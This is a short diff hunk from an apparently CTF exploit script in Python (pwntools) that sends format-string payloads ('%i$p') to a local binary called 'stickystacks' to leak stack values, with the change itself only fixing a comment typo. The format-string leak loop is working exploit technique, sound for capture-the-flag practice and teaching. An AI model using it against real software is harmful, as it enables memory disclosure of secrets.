@@ -15,7 +15,7 @@ for i in range(1, 50):
     p = process('./stickystacks')
     p.sendline(f'%{i}$p')
     p.recvuntil('Welcome, ')        # pass 'Welcome, '
-    leak_stack = p.recvline()[:-1]  # [:-1] - avoi '\n'
+    leak_stack = p.recvline()[:-1]  # [:-1] - avoid '\n'
     if(leak_stack != b'(nil)'):
         data_list.append(p64(int(leak_stack.decode(), 16)))
     continue
